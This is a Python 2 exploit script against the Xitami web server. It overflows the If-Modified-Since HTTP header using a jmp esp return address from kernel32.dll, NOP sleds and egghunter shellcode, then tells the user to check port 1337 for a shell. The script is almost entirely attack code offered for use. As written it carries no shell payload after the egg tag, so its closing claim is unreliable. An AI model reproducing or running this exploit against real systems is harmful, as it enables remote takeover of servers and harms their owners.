#!/usr/bin/python
import socket
import time
import sys 

banner = """
#----------------------------------------------#
Xitami Exploit - Egghunter
#----------------------------------------------#
"""

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

#jmp esp 0x7c86467b in kernel32.dll 

egghunt = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"w00t" # 4 byte tag
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

buf = "A" * 72 + "\x7b\x46\x86\x7c" + "\xEB\x22" + "\x90" * 50 + egghunt + "w00tw00t" + "\x90" * 50

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"
